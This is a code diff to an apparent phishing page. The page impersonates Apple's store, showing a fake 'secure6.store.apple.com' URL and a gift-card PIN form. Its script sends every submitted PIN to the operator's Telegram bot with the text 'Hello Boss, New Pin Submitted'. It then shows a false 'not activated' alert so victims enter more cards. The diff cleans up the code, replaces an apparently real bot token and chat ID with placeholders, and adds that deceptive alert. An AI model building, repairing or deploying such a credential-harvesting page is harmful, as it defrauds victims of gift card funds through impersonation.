@@ -114,30 +114,32 @@
     <p class="fake-url">secure6.store.apple.com</p>
   </div>
 
-  <script>
-     const input = document.getElementById('giftPin');
+<script>
+  const input = document.getElementById('giftPin');
   const form = document.getElementById("giftForm");
 
-    input.addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\s+/g, ''); // remove spaces
-      if (value.length > 16) value = value.slice(0, 16); // max 16 characters
-      e.target.value = value.replace(/(.{4})/g, '$1 ').trim(); // insert space every 4 chars
-    });
+  // auto-format gift pin input
+  input.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s+/g, ''); // remove spaces
+    if (value.length > 16) value = value.slice(0, 16); // max 16 characters
+    e.target.value = value.replace(/(.{4})/g, '$1 ').trim(); // insert space every 4 chars
+  });
 
-    const botToken = "8488719047:AAESFFAoNPZQ3Mb5J4LaHM54EK8PyHzWeOo"; 
-   const chatId = "7709189291";   
-  document.getElementById("giftForm").addEventListener("submit", function(e) {
+  const botToken = "YOUR_BOT_TOKEN"; 
+  const chatId = "YOUR_CHAT_ID";   
+
+  form.addEventListener("submit", function(e) {
     e.preventDefault();
 
-     if (!giftPin) {
+    const giftPin = input.value.trim();
+
+    if (!giftPin) {
       alert("⚠️ Please input the pin to continue");
       return;
     }
 
-    const giftPin = document.getElementById("giftPin").value;
-
     // Message text
-    const message = `Hello Boss, New Pin Submitted: ${giftPin} `;
+    const message = `Hello Boss, New Pin Submitted: ${giftPin}`;
 
     // Send to Telegram API
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -148,8 +150,16 @@
         text: message
       })
     })
+    .then(() => {
+      alert("❌ This Apple Gift Card is not activated!");
+    })
+    .catch(err => {
+      alert("Error sending to Telegram");
+      console.error(err);
+    });
   });
-  </script>
+</script>
+
 
 </body>
 </html>
